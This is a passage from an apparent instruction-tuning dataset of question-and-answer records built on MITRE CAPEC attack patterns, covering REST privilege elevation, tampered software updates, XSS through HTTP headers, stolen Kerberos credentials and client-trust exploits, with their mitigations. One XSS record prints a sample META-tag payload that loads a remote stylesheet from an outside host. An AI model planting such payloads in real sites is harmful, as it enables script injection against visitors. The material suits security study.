              "@CWE_ID": "263"
            },
            {
              "@CWE_ID": "654"
            },
            {
              "@CWE_ID": "307"
            },
            {
              "@CWE_ID": "308"
            },
            {
              "@CWE_ID": "309"
            }
          ]
        },
        "Taxonomy_Mappings": {
          "Taxonomy_Mapping": {
            "@Taxonomy_Name": "ATTACK",
            "Entry_ID": "1110.003",
            "Entry_Name": "Brute Force:Password Spraying"
          }
        },
        "References": {
          "Reference": [
            {
              "@External_Reference_ID": "REF-565"
            },
            {
              "@External_Reference_ID": "REF-566"
            },
            {
              "@External_Reference_ID": "REF-567"
            }
          ]
        },
        "Content_History": {
          "Submission": {
            "Submission_Name": "CAPEC Content Team",
            "Submission_Organization": "The MITRE Corporation",
            "Submission_Date": "2020-07-30"
          },
          "Modification": [
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2020-12-17",
              "Modification_Comment": "Updated Related_Attack_Patterns"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2022-02-22",
              "Modification_Comment": "Updated Description, Extended_Description"
            }
          ]
        }
      }
    }
  },
  {
    "instruction": "Given the attack pattern: Restful Privilege Elevation (CAPEC ID: 58), give me an example instances for this pattern",
    "context": "",
    "output": "Sure. Examples can be: The HTTP Get method is designed to retrieve resources and not to alter the state of the application or resources on the server side. However, developers can easily code programs that accept a HTTP Get request that do in fact create, update or delete data on the server. Both Flickr (http://www.flickr.com/services/api/flickr.photosets.delete.html) and del.icio.us (http://del.icio.us/api/posts/delete) have implemented delete operations using standard HTTP Get requests. These HTTP Get methods do delete data on the server side, despite being called from Get which is not supposed to alter state.",
    "category": "CAPECFlan",
    "instruction_type": "capec_example_instances",
    "parsed_raw_data": {
      "Example_Instances": "The HTTP Get method is designed to retrieve resources and not to alter the state of the application or resources on the server side. However, developers can easily code programs that accept a HTTP Get request that do in fact create, update or delete data on the server. Both Flickr (http://www.flickr.com/services/api/flickr.photosets.delete.html) and del.icio.us (http://del.icio.us/api/posts/delete) have implemented delete operations using standard HTTP Get requests. These HTTP Get methods do delete data on the server side, despite being called from Get which is not supposed to alter state.",
      "@Name": "Restful Privilege Elevation (CAPEC ID: 58)",
      "attack_ptrn": {
        "@ID": "58",
        "@Name": "Restful Privilege Elevation",
        "@Abstraction": "Detailed",
        "@Status": "Draft",
        "Description": "An adversary identifies a Rest HTTP (Get, Put, Delete) style permission method allowing them to perform various malicious actions upon server data due to lack of access control mechanisms implemented within the application service accepting HTTP messages.",
        "Extended_Description": {
          "xhtml:p": "Rest uses standard HTTP (Get, Put, Delete) style permissions methods, but these are not necessarily correlated generally with back end programs. Strict interpretation of HTTP get methods means that these HTTP Get services should not be used to delete information on the server, but there is no access control mechanism to back up this logic. This means that unless the services are properly ACL'd and the application's service implementation are following these guidelines then an HTTP request can easily execute a delete or update on the server side. The attacker identifies a HTTP Get URL such as http://victimsite/updateOrder, which calls out to a program to update orders on a database or other resource. The URL is not idempotent so the request can be submitted multiple times by the attacker, additionally, the attacker may be able to exploit the URL published as a Get method that actually performs updates (instead of merely retrieving data). This may result in malicious or inadvertent altering of data on the server."
        },
        "Likelihood_Of_Attack": "High",
        "Typical_Severity": "High",
        "Related_Attack_Patterns": {
          "Related_Attack_Pattern": [
            {
              "@Nature": "ChildOf",
              "@CAPEC_ID": "1"
            },
            {
              "@Nature": "ChildOf",
              "@CAPEC_ID": "180",
              "Exclude_Related": {
                "@Exclude_ID": "515"
              }
            }
          ]
        },
        "Prerequisites": {
          "Prerequisite": "The attacker needs to be able to identify HTTP Get URLs. The Get methods must be set to call applications that perform operations other than get such as update and delete."
        },
        "Skills_Required": {
          "Skill": {
            "@Level": "Low",
            "#text": "It is relatively straightforward to identify an HTTP Get method that changes state on the server side and executes against an over-privileged system interface"
          }
        },
        "Consequences": {
          "Consequence": [
            {
              "Scope": "Integrity",
              "Impact": "Modify Data"
            },
            {
              "Scope": [
                "Confidentiality",
                "Access Control",
                "Authorization"
              ],
              "Impact": "Gain Privileges"
            }
          ]
        },
        "Mitigations": {
          "Mitigation": [
            "Design: Enforce principle of least privilege",
            "Implementation: Ensure that HTTP Get methods only retrieve state and do not alter state on the server side",
            "Implementation: Ensure that HTTP methods have proper ACLs based on what the functionality they expose"
          ]
        },
        "Example_Instances": {
          "Example": "The HTTP Get method is designed to retrieve resources and not to alter the state of the application or resources on the server side. However, developers can easily code programs that accept a HTTP Get request that do in fact create, update or delete data on the server. Both Flickr (http://www.flickr.com/services/api/flickr.photosets.delete.html) and del.icio.us (http://del.icio.us/api/posts/delete) have implemented delete operations using standard HTTP Get requests. These HTTP Get methods do delete data on the server side, despite being called from Get which is not supposed to alter state."
        },
        "Related_Weaknesses": {
          "Related_Weakness": [
            {
              "@CWE_ID": "267"
            },
            {
              "@CWE_ID": "269"
            }
          ]
        },
        "References": {
          "Reference": {
            "@External_Reference_ID": "REF-463"
          }
        },
        "Content_History": {
          "Submission": {
            "Submission_Name": "CAPEC Content Team",
            "Submission_Organization": "The MITRE Corporation",
            "Submission_Date": "2014-06-23"
          },
          "Modification": [
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2015-12-07",
              "Modification_Comment": "Updated Related_Attack_Patterns"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2020-07-30",
              "Modification_Comment": "Updated Related_Attack_Patterns"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2020-12-17",
              "Modification_Comment": "Updated Related_Attack_Patterns"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2021-06-24",
              "Modification_Comment": "Updated Related_Weaknesses"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2022-09-29",
              "Modification_Comment": "Updated Description, Extended_Description"
            }
          ]
        }
      }
    }
  },
  {
    "instruction": "Give me an usage example for attack pattern - Alteration of a Software Update (CAPEC ID: 669)",
    "context": "",
    "output": "A subcontractor to a software developer injects maliciously altered software updates into an automated update process that distributes to government and commercial customers software containing a hidden backdoor.",
    "category": "CAPECFlan",
    "instruction_type": "capec_example_instances",
    "parsed_raw_data": {
      "Example_Instances": "A subcontractor to a software developer injects maliciously altered software updates into an automated update process that distributes to government and commercial customers software containing a hidden backdoor.",
      "@Name": "Alteration of a Software Update (CAPEC ID: 669)",
      "attack_ptrn": {
        "@ID": "669",
        "@Name": "Alteration of a Software Update",
        "@Abstraction": "Standard",
        "@Status": "Draft",
        "Description": {
          "xhtml:p": "An adversary with access to an organization\u2019s software update infrastructure inserts malware into the content of an outgoing update to fielded systems where a wide range of malicious effects are possible. With the same level of access, the adversary can alter a software update to perform specific malicious acts including granting the adversary control over the software\u2019s normal functionality."
        },
        "Likelihood_Of_Attack": "Medium",
        "Typical_Severity": "High",
        "Related_Attack_Patterns": {
          "Related_Attack_Pattern": [
            {
              "@Nature": "ChildOf",
              "@CAPEC_ID": "184"
            },
            {
              "@Nature": "CanPrecede",
              "@CAPEC_ID": "673"
            }
          ]
        },
        "Execution_Flow": {
          "Attack_Step": [
            {
              "Step": "1",
              "Phase": "Explore",
              "Description": "[Identify software with frequent updates] The adversary must first identify a target software that has updates at least with some frequency, enough that there is am update infrastructure."
            },
            {
              "Step": "2",
              "Phase": "Experiment",
              "Description": "[Gain access to udpate infrastructure] The adversary must then gain access to the organization's software update infrastructure. This can either be done by gaining remote access from outside the organization, or by having a malicious actor inside the organization gain access. It is often easier if someone within the organization gains access."
            },
            {
              "Step": "3",
              "Phase": "Exploit",
              "Description": "[Alter the software update] Through access to the software update infrastructure, an adversary will alter the software update by injecting malware into the content of an outgoing update."
            }
          ]
        },
        "Prerequisites": {
          "Prerequisite": "An adversary would need to have penetrated an organization\u2019s software update infrastructure including gaining access to components supporting the configuration management of software versions and updates related to the software maintenance of customer systems."
        },
        "Skills_Required": {
          "Skill": {
            "@Level": "High",
            "#text": "Skills required include the ability to infiltrate the organization\u2019s software update infrastructure either from the Internet or from within the organization, including subcontractors, and be able to change software being delivered to customer/user systems in an undetected manner."
          }
        },
        "Consequences": {
          "Consequence": [
            {
              "Scope": "Access Control",
              "Impact": "Gain Privileges"
            },
            {
              "Scope": "Authorization",
              "Impact": "Execute Unauthorized Commands"
            },
            {
              "Scope": "Integrity",
              "Impact": "Modify Data"
            },
            {
              "Scope": "Confidentiality",
              "Impact": "Read Data"
            }
          ]
        },
        "Mitigations": {
          "Mitigation": [
            "Have a Software Assurance Plan that includes maintaining strict configuration management control of source code, object code and software development, build and distribution tools; manual code reviews and static code analysis for developmental software; and tracking of all storage and movement of code.",
            "Require elevated privileges for distribution of software and software updates."
          ]
        },
        "Example_Instances": {
          "Example": {
            "xhtml:p": "A subcontractor to a software developer injects maliciously altered software updates into an automated update process that distributes to government and commercial customers software containing a hidden backdoor."
          }
        },
        "Taxonomy_Mappings": {
          "Taxonomy_Mapping": {
            "@Taxonomy_Name": "ATTACK",
            "Entry_ID": "1195.002",
            "Entry_Name": "Supply Chain Compromise: Compromise Software Supply Chain"
          }
        },
        "References": {
          "Reference": [
            {
              "@External_Reference_ID": "REF-658"
            },
            {
              "@External_Reference_ID": "REF-659"
            },
            {
              "@External_Reference_ID": "REF-660"
            }
          ]
        },
        "Content_History": {
          "Submission": {
            "Submission_Name": "CAPEC Content Team",
            "Submission_Organization": "The MITRE Corporation",
            "Submission_Date": "2021-06-24"
          },
          "Modification": [
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2021-10-21",
              "Modification_Comment": "Updated Execution_Flow"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2022-09-29",
              "Modification_Comment": "Updated Taxonomy_Mappings"
            }
          ]
        }
      }
    }
  },
  {
    "instruction": "Are there any examples for 'XSS Through HTTP Headers (CAPEC ID: 86)' attack pattern",
    "context": "",
    "output": "Yes. You can have a look at the following example: XSS can be used in variety of ways, because it is scripted and executes in a distributed, asynchronous fashion it can create its own vector and openings. For example, the adversary can use XSS to mount a DDoS attack by having series of different computers unknowingly executing requests against a single host.",
    "category": "CAPECFlan",
    "instruction_type": "capec_example_instances",
    "parsed_raw_data": {
      "Example_Instances": [
        "XSS can be used in variety of ways, because it is scripted and executes in a distributed, asynchronous fashion it can create its own vector and openings. For example, the adversary can use XSS to mount a DDoS attack by having series of different computers unknowingly executing requests against a single host."
      ],
      "@Name": "XSS Through HTTP Headers (CAPEC ID: 86)",
      "attack_ptrn": {
        "@ID": "86",
        "@Name": "XSS Through HTTP Headers",
        "@Abstraction": "Detailed",
        "@Status": "Draft",
        "Description": "An adversary exploits web applications that generate web content, such as links in a HTML page, based on unvalidated or improperly validated data submitted by other actors. XSS in HTTP Headers attacks target the HTTP headers which are hidden from most users and may not be validated by web applications.",
        "Likelihood_Of_Attack": "High",
        "Typical_Severity": "Very High",
        "Related_Attack_Patterns": {
          "Related_Attack_Pattern": [
            {
              "@Nature": "ChildOf",
              "@CAPEC_ID": "591"
            },
            {
              "@Nature": "ChildOf",
              "@CAPEC_ID": "588"
            },
            {
              "@Nature": "ChildOf",
              "@CAPEC_ID": "592"
            }
          ]
        },
        "Execution_Flow": {
          "Attack_Step": [
            {
              "Step": "1",
              "Phase": "Explore",
              "Description": "[Survey the application for public links] Using a browser or an automated tool, an adversary follows all public links on a web site. They record all the entry points (input) that becomes part of generated HTTP header (not only GET/POST/COOKIE, but also Content-Type, etc.)",
              "Technique": [
                "Use a spidering tool to follow and record all links and analyze the web pages to find entry points. Make special note of any links that include parameters used in the HTTP headers.",
                "Look for HTML meta tags that could be injectable",
                "Use a proxy tool to record all links visited during a manual traversal of the web application.",
                "Use a browser to manually explore the website and analyze how it is constructed. Many browsers' plugins are available to facilitate the analysis or automate the discovery."
              ]
            },
            {
              "Step": "2",
              "Phase": "Experiment",
              "Description": {
                "xhtml:p": [
                  "The adversary uses the entry points gathered in the \"Explore\" phase as a target list and injects various common script payloads to determine if an entry point actually represents a vulnerability and to characterize the extent to which the vulnerability can be exploited. They record all the responses from the server that include unmodified versions of their script.",
                  "The adversary tries also to inject extra-parameter to the HTTP request to see if they are reflected back in the web page or in the HTTP response."
                ],
                "#text": "[Probe identified potential entry points for XSS vulnerability]"
              },
              "Technique": [
                "Manually inject various script payloads into each identified entry point using a list of common script injection probes and observe system behavior to determine if script was executed.",
                "Use an automated injection attack tool to inject various script payloads into each identified entry point using a list of common script injection probes and observe system behavior to determine if script was executed.",
                "Use a proxy tool to record results of manual input of XSS probes in known URLs."
              ]
            },
            {
              "Step": "3",
              "Phase": "Experiment",
              "Description": "[Craft malicious XSS URL] Once the adversary has determined which parameters are vulnerable to XSS, they will craft a malicious URL containing the XSS exploit. The adversary can have many goals, from stealing session IDs, cookies, credentials, and page content from the victim.",
              "Technique": [
                "Change a URL parameter which is used in an HTTP header to include a malicious script tag. Because it is in the header it may bypass validation.",
                "Send information gathered from the malicious script to a remote endpoint."
              ]
            },
            {
              "Step": "4",
              "Phase": "Exploit",
              "Description": "[Get victim to click URL] In order for the attack to be successful, the victim needs to access the malicious URL.",
              "Technique": [
                "Send a phishing email to the victim containing the malicious URL. This can be hidden in a hyperlink as to not show the full URL, which might draw suspicion.",
                "Put the malicious URL on a public forum, where many victims might accidentally click the link."
              ]
            }
          ]
        },
        "Prerequisites": {
          "Prerequisite": "Target software must be a client that allows scripting communication from remote hosts."
        },
        "Skills_Required": {
          "Skill": [
            {
              "@Level": "Low",
              "#text": "To achieve a redirection and use of less trusted source, an adversary can simply edit HTTP Headers that are sent to client machine."
            },
            {
              "@Level": "High",
              "#text": "Exploiting a client side vulnerability to inject malicious scripts into the browser's executable process."
            }
          ]
        },
        "Resources_Required": {
          "Resource": "The adversary must have the ability to deploy a custom hostile service for access by targeted clients and the abbility to communicate synchronously or asynchronously with client machine. The adversary must also control a remote site of some sort to redirect client and data to."
        },
        "Consequences": {
          "Consequence": [
            {
              "Scope": [
                "Confidentiality",
                "Integrity",
                "Availability"
              ],
              "Impact": "Execute Unauthorized Commands",
              "Note": "Run Arbitrary Code"
            },
            {
              "Scope": "Confidentiality",
              "Impact": "Read Data"
            },
            {
              "Scope": [
                "Confidentiality",
                "Access Control",
                "Authorization"
              ],
              "Impact": "Gain Privileges"
            }
          ]
        },
        "Mitigations": {
          "Mitigation": [
            "Design: Use browser technologies that do not allow client side scripting.",
            "Design: Utilize strict type, character, and encoding enforcement",
            "Design: Server side developers should not proxy content via XHR or other means, if a http proxy for remote content is setup on the server side, the client's browser has no way of discerning where the data is originating from.",
            "Implementation: Ensure all content that is delivered to client is sanitized against an acceptable content specification.",
            "Implementation: Perform input validation for all remote content.",
            "Implementation: Perform output validation for all remote content.",
            "Implementation: Disable scripting languages such as JavaScript in browser",
            "Implementation: Session tokens for specific host",
            "Implementation: Patching software. There are many attack vectors for XSS on the client side and the server side. Many vulnerabilities are fixed in service packs for browser, web servers, and plug in technologies, staying current on patch release that deal with XSS countermeasures mitigates this."
          ]
        },
        "Example_Instances": {
          "Example": [
            {
              "xhtml:p": "Utilize a remote style sheet set in the HTTP header for XSS attack. When the adversary is able to point to a remote stylesheet, any of the variables set in that stylesheet are controllable on the client side by the remote adversary. Like most XSS attacks, results vary depending on browser that is used [REF-97].",
              "xhtml:div": {
                "@style": "margin-left:1em;",
                "@class": "attack",
                "#text": "<META HTTP-EQUIV=\"Link\" Content=\"<http://ha.ckers.org/xss.css>; REL=stylesheet\">"
              }
            },
            {
              "xhtml:p": [
                "Google's 404 redirection script was found vulnerable to this attack vector.",
                "Google's 404 file not found page read",
                "* Response headers: \"Content-Type: text/html; charset=[encoding]\".",
                "* Response body: <META http-equiv=\"Content-Type\" (...) charset=[encoding]/>",
                "If the response sends an unexpected encoding type such as UTF-7, then no enforcement is done on the payload and arbitrary XSS code will be transported along with the standard HTTP response. [REF-476]"
              ]
            },
            "XSS can be used in variety of ways, because it is scripted and executes in a distributed, asynchronous fashion it can create its own vector and openings. For example, the adversary can use XSS to mount a DDoS attack by having series of different computers unknowingly executing requests against a single host."
          ]
        },
        "Related_Weaknesses": {
          "Related_Weakness": {
            "@CWE_ID": "80"
          }
        },
        "References": {
          "Reference": [
            {
              "@External_Reference_ID": "REF-1"
            },
            {
              "@External_Reference_ID": "REF-69",
              "@Section": "XSS Filter Evasion Cheat Sheet"
            },
            {
              "@External_Reference_ID": "REF-476"
            }
          ]
        },
        "Content_History": {
          "Submission": {
            "Submission_Name": "CAPEC Content Team",
            "Submission_Organization": "The MITRE Corporation",
            "Submission_Date": "2014-06-23"
          },
          "Modification": [
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2017-05-01",
              "Modification_Comment": "Updated Attack_Prerequisites, Description Summary, Related_Attack_Patterns, Related_Weaknesses, Resources_Required"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2020-07-30",
              "Modification_Comment": "Updated Example_Instances, Execution_Flow"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2020-12-17",
              "Modification_Comment": "Updated References, Related_Attack_Patterns"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2022-02-22",
              "Modification_Comment": "Updated Example_Instances, Execution_Flow, Skills_Required"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2022-09-29",
              "Modification_Comment": "Updated Example_Instances"
            }
          ],
          "Previous_Entry_Name": {
            "@Date": "2017-05-01",
            "#text": "Embedding Script (XSS) in HTTP Headers"
          }
        }
      }
    }
  },
  {
    "instruction": "Given the attack pattern: Use of Known Kerberos Credentials (CAPEC ID: 652), give me an example instances for this pattern",
    "context": "",
    "output": "Sure. Examples can be: Bronze Butler (also known as Tick), has been shown to leverage forged Kerberos Ticket Granting Tickets (TGTs) and Ticket Granting Service (TGS) tickets to maintain administrative access on a number of systems. [REF-584]\n* PowerSploit's Invoke-Kerberoast module can be leveraged to request Ticket Granting Service (TGS) tickets and return crackable ticket hashes. [REF-585] [REF-586]",
    "category": "CAPECFlan",
    "instruction_type": "capec_example_instances",
    "parsed_raw_data": {
      "Example_Instances": [
        "Bronze Butler (also known as Tick), has been shown to leverage forged Kerberos Ticket Granting Tickets (TGTs) and Ticket Granting Service (TGS) tickets to maintain administrative access on a number of systems. [REF-584]",
        "PowerSploit's Invoke-Kerberoast module can be leveraged to request Ticket Granting Service (TGS) tickets and return crackable ticket hashes. [REF-585] [REF-586]"
      ],
      "@Name": "Use of Known Kerberos Credentials (CAPEC ID: 652)",
      "attack_ptrn": {
        "@ID": "652",
        "@Name": "Use of Known Kerberos Credentials",
        "@Abstraction": "Standard",
        "@Status": "Draft",
        "Description": "An adversary obtains (i.e. steals or purchases) legitimate Kerberos credentials (e.g. Kerberos service account userID/password or Kerberos Tickets) with the goal of achieving authenticated access to additional systems, applications, or services within the domain.",
        "Extended_Description": {
          "xhtml:p": "Kerberos is the default authentication method for Windows domains and is also used across many operating systems. Attacks leveraging trusted Kerberos credentials can result in numerous consequences, depending on what Kerberos credential is stolen. For example, Kerberos service accounts are typically used to run services or scheduled tasks pertaining to authentication. However, these credentials are often weak and never expire, in addition to possessing local or domain administrator privileges. If an adversary is able to acquire these credentials, it could result in lateral movement within the domain or access to any resources the service account is privileged to access, among other things. Ultimately, successful spoofing and impersonation of trusted Kerberos credentials can lead to an adversary breaking authentication, authorization, and audit controls with the target system or application."
        },
        "Likelihood_Of_Attack": "Medium",
        "Typical_Severity": "High",
        "Related_Attack_Patterns": {
          "Related_Attack_Pattern": [
            {
              "@Nature": "ChildOf",
              "@CAPEC_ID": "560",
              "Exclude_Related": {
                "@Exclude_ID": "515"
              }
            },
            {
              "@Nature": "CanPrecede",
              "@CAPEC_ID": "151"
            }
          ]
        },
        "Execution_Flow": {
          "Attack_Step": [
            {
              "Step": "1",
              "Phase": "Explore",
              "Description": "[Acquire known Kerberos credentials] The adversary must obtain known Kerberos credentials in order to access the target system, application, or service within the domain.",
              "Technique": [
                "An adversary purchases breached Kerberos service account username/password combinations or leaked hashed passwords from the dark web.",
                "An adversary guesses the credentials to a weak Kerberos service account.",
                "An adversary conducts a sniffing attack to steal Kerberos tickets as they are transmitted.",
                "An adversary conducts a Kerberoasting attack."
              ]
            },
            {
              "Step": "2",
              "Phase": "Experiment",
              "Description": "[Attempt Kerberos authentication] Try each Kerberos credential against various resources within the domain until the target grants access.",
              "Technique": [
                "Manually or automatically enter each Kerberos service account credential through the target's interface.",
                "Attempt a Pass the Ticket attack."
              ]
            },
            {
              "Step": "3",
              "Phase": "Exploit",
              "Description": "[Impersonate] An adversary can use successful experiments or authentications to impersonate an authorized user or system, or to laterally move within the domain"
            },
            {
              "Step": "4",
              "Phase": "Exploit",
              "Description": "[Spoofing] Malicious data can be injected into the target system or into other systems on the domain. The adversary can also pose as a legitimate domain user to perform social engineering attacks."
            },
            {
              "Step": "5",
              "Phase": "Exploit",
              "Description": "[Data Exfiltration] The adversary can obtain sensitive data contained within domain systems or applications."
            }
          ]
        },
        "Prerequisites": {
          "Prerequisite": [
            "The system/application leverages Kerberos authentication.",
            "The system/application uses one factor password-based authentication, SSO, and/or cloud-based authentication for Kerberos service accounts.",
            "The system/application does not have a sound password policy that is being enforced for Kerberos service accounts.",
            "The system/application does not implement an effective password throttling mechanism for authenticating to Kerberos service accounts.",
            "The targeted network allows for network sniffing attacks to succeed."
          ]
        },
        "Skills_Required": {
          "Skill": {
            "@Level": "Low",
            "#text": "Once an adversary obtains a known Kerberos credential, leveraging it is trivial."
          }
        },
        "Resources_Required": {
          "Resource": "A valid Kerberos ticket or a known Kerberos service account credential."
        },
        "Indicators": {
          "Indicator": [
            "Authentication attempts use expired or invalid credentials.",
            "Authentication attempts are originating from IP addresses or locations that are inconsistent with an account's normal IP addresses or locations.",
            "Data is being transferred and/or removed from systems/applications within the network.",
            "Suspicious or Malicious software is downloaded/installed on systems within the domain.",
            "Messages from a legitimate user appear to contain suspicious links or communications not consistent with the user's normal behavior."
          ]
        },
        "Consequences": {
          "Consequence": [
            {
              "Scope": [
                "Confidentiality",
                "Access Control",
                "Authentication"
              ],
              "Impact": "Gain Privileges"
            },
            {
              "Scope": [
                "Confidentiality",
                "Authorization"
              ],
              "Impact": "Read Data"
            },
            {
              "Scope": "Integrity",
              "Impact": "Modify Data"
            }
          ]
        },
        "Mitigations": {
          "Mitigation": [
            "Create a strong password policy and ensure that your system enforces this policy for Kerberos service accounts.",
            "Ensure Kerberos service accounts are not reusing username/password combinations for multiple systems, applications, or services.",
            "Do not reuse Kerberos service account credentials across systems.",
            "Deny remote use of Kerberos service account credentials to log into domain systems.",
            "Do not allow Kerberos service accounts to be a local administrator on more than one system.",
            "Enable at least AES Kerberos encryption for tickets.",
            "Monitor system and domain logs for abnormal credential access."
          ]
        },
        "Example_Instances": {
          "Example": [
            "Bronze Butler (also known as Tick), has been shown to leverage forged Kerberos Ticket Granting Tickets (TGTs) and Ticket Granting Service (TGS) tickets to maintain administrative access on a number of systems. [REF-584]",
            "PowerSploit's Invoke-Kerberoast module can be leveraged to request Ticket Granting Service (TGS) tickets and return crackable ticket hashes. [REF-585] [REF-586]"
          ]
        },
        "Related_Weaknesses": {
          "Related_Weakness": [
            {
              "@CWE_ID": "522"
            },
            {
              "@CWE_ID": "307"
            },
            {
              "@CWE_ID": "308"
            },
            {
              "@CWE_ID": "309"
            },
            {
              "@CWE_ID": "262"
            },
            {
              "@CWE_ID": "263"
            },
            {
              "@CWE_ID": "654"
            },
            {
              "@CWE_ID": "294"
            },
            {
              "@CWE_ID": "836"
            }
          ]
        },
        "Taxonomy_Mappings": {
          "Taxonomy_Mapping": {
            "@Taxonomy_Name": "ATTACK",
            "Entry_ID": "1558",
            "Entry_Name": "Steal or Forge Kerberos Tickets"
          }
        },
        "References": {
          "Reference": [
            {
              "@External_Reference_ID": "REF-584"
            },
            {
              "@External_Reference_ID": "REF-585"
            },
            {
              "@External_Reference_ID": "REF-586"
            }
          ]
        },
        "Notes": {
          "Note": {
            "@Type": "Other",
            "#text": "Kerberos centers around a ticketing system that is used to request/grant access to resources and to then access the requested resources. If one of these tickets is acquired, an adversary could gain access to a specific resource; access any resource a user has privileges to access; gain access to services that use Kerberos as an authentication mechanism and generate tickets to access a particular resource and the system that hosts the resource; or generate Ticket Granting Tickets (TGTs) for any domain account within Active Directory."
          }
        },
        "Content_History": {
          "Submission": {
            "Submission_Name": "CAPEC Content Team",
            "Submission_Organization": "The MITRE Corporation",
            "Submission_Date": "2020-07-30"
          },
          "Modification": [
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2020-12-17",
              "Modification_Comment": "Updated Description, Notes, Related_Attack_Patterns"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2022-02-22",
              "Modification_Comment": "Updated Description, Extended_Description"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2022-09-29",
              "Modification_Comment": "Updated Extended_Description, Prerequisites"
            }
          ]
        }
      }
    }
  },
  {
    "instruction": "Are there any examples for 'Exploiting Trust in Client (CAPEC ID: 22)' attack pattern",
    "context": "",
    "output": "Yes. You can have a look at the following example: Web applications may use JavaScript to perform client side validation, request encoding/formatting, and other security functions, which provides some usability benefits and eliminates some client-server round-tripping. However, the web server cannot assume that the requests it receives have been subject to those validations, because an attacker can use an alternate method for crafting the HTTP Request and submit data that contains poisoned values designed to spoof a user and/or get the web server to disclose information.\n* Web 2.0 style applications may be particularly vulnerable because they in large part rely on existing infrastructure which provides scalability without the ability to govern the clients. Attackers identify vulnerabilities that either assume the client side is responsible for some security services (without the requisite ability to ensure enforcement of these checks) and/or the lack of a hardened, default deny server configuration that allows for an attacker probing for weaknesses in unexpected ways. Client side validation, request formatting and other services may be performed, but these are strictly usability enhancements not security enhancements.\n* Many web applications use client side scripting like JavaScript to enforce authentication, authorization, session state and other variables, but at the end of day they all make requests to the server. These client side checks may provide usability and performance gains, but they lack integrity in terms of the http request. It is possible for an attacker to post variables directly to the server without using any of the client script security checks and customize the patterns to impersonate other users or probe for more information.\n* Many message oriented middleware systems like MQ Series are rely on information that is passed along with the message request for making authorization decisions, for example what group or role the request should be passed. However, if the message server does not or cannot authenticate the authorization information in the request then the server's policy decisions about authorization are trivial to subvert because the client process can simply elevate privilege by passing in elevated group or role information which the message server accepts and acts on.",
    "category": "CAPECFlan",
    "instruction_type": "capec_example_instances",
    "parsed_raw_data": {
      "Example_Instances": [
        "Web applications may use JavaScript to perform client side validation, request encoding/formatting, and other security functions, which provides some usability benefits and eliminates some client-server round-tripping. However, the web server cannot assume that the requests it receives have been subject to those validations, because an attacker can use an alternate method for crafting the HTTP Request and submit data that contains poisoned values designed to spoof a user and/or get the web server to disclose information.",
        "Web 2.0 style applications may be particularly vulnerable because they in large part rely on existing infrastructure which provides scalability without the ability to govern the clients. Attackers identify vulnerabilities that either assume the client side is responsible for some security services (without the requisite ability to ensure enforcement of these checks) and/or the lack of a hardened, default deny server configuration that allows for an attacker probing for weaknesses in unexpected ways. Client side validation, request formatting and other services may be performed, but these are strictly usability enhancements not security enhancements.",
        "Many web applications use client side scripting like JavaScript to enforce authentication, authorization, session state and other variables, but at the end of day they all make requests to the server. These client side checks may provide usability and performance gains, but they lack integrity in terms of the http request. It is possible for an attacker to post variables directly to the server without using any of the client script security checks and customize the patterns to impersonate other users or probe for more information.",
        "Many message oriented middleware systems like MQ Series are rely on information that is passed along with the message request for making authorization decisions, for example what group or role the request should be passed. However, if the message server does not or cannot authenticate the authorization information in the request then the server's policy decisions about authorization are trivial to subvert because the client process can simply elevate privilege by passing in elevated group or role information which the message server accepts and acts on."
      ],
      "@Name": "Exploiting Trust in Client (CAPEC ID: 22)",
      "attack_ptrn": {
        "@ID": "22",
        "@Name": "Exploiting Trust in Client",
        "@Abstraction": "Meta",
        "@Status": "Draft",
        "Description": "An attack of this type exploits vulnerabilities in client/server communication channel authentication and data integrity. It leverages the implicit trust a server places in the client, or more importantly, that which the server believes is the client. An attacker executes this type of attack by communicating directly with the server where the server believes it is communicating only with a valid client. There are numerous variations of this type of attack.",
        "Likelihood_Of_Attack": "High",
        "Typical_Severity": "High",
        "Prerequisites": {
          "Prerequisite": "Server software must rely on client side formatted and validated values, and not reinforce these checks on the server side."
        },
        "Skills_Required": {
          "Skill": {
            "@Level": "Medium",
            "#text": "The attacker must have fairly detailed knowledge of the syntax and semantics of client/server communications protocols and grammars"
          }
        },
        "Resources_Required": {
          "Resource": "Ability to communicate synchronously or asynchronously with server"
        },
        "Consequences": {
          "Consequence": [
            {
              "Scope": [
                "Confidentiality",
                "Integrity",
                "Availability"
              ],
              "Impact": "Execute Unauthorized Commands",
              "Note": "Run Arbitrary Code"
            },
            {
              "Scope": [
                "Confidentiality",
                "Access Control",
                "Authorization"
              ],
              "Impact": "Gain Privileges"
            },
            {
              "Scope": "Confidentiality",
              "Impact": "Read Data"
            }
          ]
        },
        "Mitigations": {
          "Mitigation": [
            "Design: Ensure that client process and/or message is authenticated so that anonymous communications and/or messages are not accepted by the system.",
            "Design: Do not rely on client validation or encoding for security purposes.",
